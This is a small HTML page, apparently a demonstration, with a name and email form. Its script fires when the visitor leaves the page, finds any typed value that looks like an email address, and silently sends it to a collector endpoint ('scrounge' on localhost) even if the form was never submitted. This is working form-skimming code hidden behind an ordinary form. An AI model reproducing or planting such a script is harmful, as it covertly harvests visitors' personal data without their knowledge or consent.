<html>
<body>
<form id='form' action="action_page.php">
  First name:<br>
  <input type="text" name="firstname"><br>
  Last name:<br>
  <input type="text" name="lastname"><br>
  Email:<br>
  <input type="text" name="email">
  <input type="submit" value="Submit">
</form>
</body>
<script>
window.addEventListener("beforeunload", function( event ) {
	var inputs = document.getElementsByTagName('input');
	for (i = 0; i < inputs.length; i++) {
    	var input = inputs[i];
    	var text = input.value;
    	if (validateEmail(text)) {
    		var xmlHttp = new XMLHttpRequest();
   			xmlHttp.open( "GET", "http://localhost:8080/scrounge/" + text, false ); // false for synchronous request
    		xmlHttp.send( null );
    	}
    }
});
function validateEmail(email) {
    var re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(email);
}

</script>
</html>